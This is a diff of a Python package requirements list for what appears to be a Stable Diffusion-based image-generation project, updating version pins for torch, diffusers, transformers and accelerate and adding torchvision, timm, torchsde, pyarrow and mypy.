 pibble[cherrypy]>=0.6
-torch<2.0,>=1.13.1
+torch>=1.13.1
+torchvision>=0.14.1
 numpy>=1.24.3
 colored<1.5,>=1.4
-diffusers<0.17,>=0.16
+diffusers<0.19,>=0.18
 albumentations<0.5,>=0.4.3
 opencv-python<4.8,>=4.7.0.72
 pudb==2019.2
 invisible-watermark<0.2,>=0.1
 imageio<3.0,>=2.9
 imageio-ffmpeg<0.5,>=0.4.2
 pytorch-lightning<2.1,>=2.0.2
 omegaconf<2.2,>=2.1.1
 test-tube<0.8,>=0.7.5
 streamlit<0.74,>=0.73
 einops<0.4,>=0.3
 torch-fidelity<0.4,>=0.3
-transformers<5.0,>=4.28
-torchmetrics==0.11.4
+transformers<5.0,>=4.30
+torchmetrics<1.1,>=1.0.0
 kornia<0.7,>=0.6
-accelerate<0.19,>=0.18
+accelerate<0.22,>=0.21
 tqdm>=4.27
 safetensors<0.4,>=0.3
 realesrgan<0.4,>=0.3
 gfpgan<1.4,>=1.3.8
 backgroundremover<0.3,>=0.2.3
 beautifulsoup4<5,>=4.12
 pystray<0.24,>=0.19
 pydantic==1.10.10
+pyarrow<13.0,>=12.0.1
 html2text==2020.1.16
+torchsde<0.3,>=0.2.5
+timm<1.0,>=0.9.2
 taming-transformers
 clip
 latent-diffusion
 
 [build]
+mypy==1.2.0
+mypy-extensions==1.0.0
 types-protobuf<5.0,>=4.23.0.1
 types-requests<3.0,>=2.30
 types-setuptools<68.0,>=67.7
 types-urllib3<2.0,>=1.26.25
 types-tabulate<0.10,>=0.9
 types-pyyaml<7.0,>=6.0
 importchecker<3.0,>=2.0
```

